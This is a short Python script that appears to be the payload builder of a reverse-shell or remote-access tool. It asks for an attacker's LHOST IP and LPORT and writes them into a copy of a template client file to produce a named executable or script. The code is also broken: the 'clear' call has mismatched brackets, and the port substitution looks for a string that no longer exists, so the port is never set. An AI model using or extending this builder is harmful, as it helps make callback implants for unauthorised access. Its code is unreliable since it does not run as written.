import subprocess
from shutil import copyfile

GREEN = '\33[32m'
END = '\33[0m'
BOLD = '\33[1m'

#print(GREEN + BOLD + "\nThis isn't set up yet! Very soon... Please use the 'client.py' with the github instructions instead.\n" + END)

subprocess.call(['clear')]

host = input(GREEN + BOLD + 'LHOST IP: ' + END)
port = input(GREEN + BOLD + 'LPORT: ' + END)
name = input(GREEN + BOLD + 'Name for exe/py file: ' + END)

exampleFile = '/source/example.py'
copiedFile = '/output/' + name + '.py'
copyfile(exampleFile, copiedFile)
with open(copiedFile, 'r') as file:
    filedata = file.read()
replaceHOST = "host = '" + host + "'"
filedata = filedata.replace("host = ''", replaceHOST)
with open(copiedFile, 'w') as file:
    file.write(filedata)

with open(copiedFile, 'r') as file:
    filedata = file.read()
replacePORT = "port = " + port
filedata = filedata.replace("host = ''", replacePORT)
with open(copiedFile, 'w') as file:
    file.write(filedata)
                
